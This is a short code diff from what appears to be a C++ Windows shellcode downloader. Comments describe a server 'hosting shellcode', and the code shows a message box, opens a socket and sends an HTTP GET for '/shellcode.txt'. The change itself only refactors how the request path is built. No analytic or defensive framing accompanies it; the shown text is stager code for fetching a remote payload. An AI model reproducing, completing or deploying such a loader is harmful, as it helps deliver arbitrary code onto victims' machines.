@@ -29,8 +29,8 @@ int main()
 	// address hosting shellcode
 	string server = "127.0.0.1";
 
-	// HTTP GET, enter path to shellcode.txt file here..
-	string get_http = "GET /shellcode.txt HTTP/1.1\r\nHost: " + server + "\r\nConnection: close\r\n\r\n";
+	// enter path to shellcode.txt file here..
+	string path = "/shellcode.txt";
 
 	// call message box/error function
 	messagebox();
@@ -44,6 +44,7 @@ int main()
 	connect(sock, (SOCKADDR*)(&SockAddr), sizeof(SockAddr));
 
 	// send HTTP GET request to server
+	string get_http = "GET " + path + " HTTP/1.1\r\nHost: " + server + "\r\nConnection: close\r\n\r\n";
 	send(sock, get_http.c_str(), strlen(get_http.c_str()), 0);
 
 	// receive and store http response
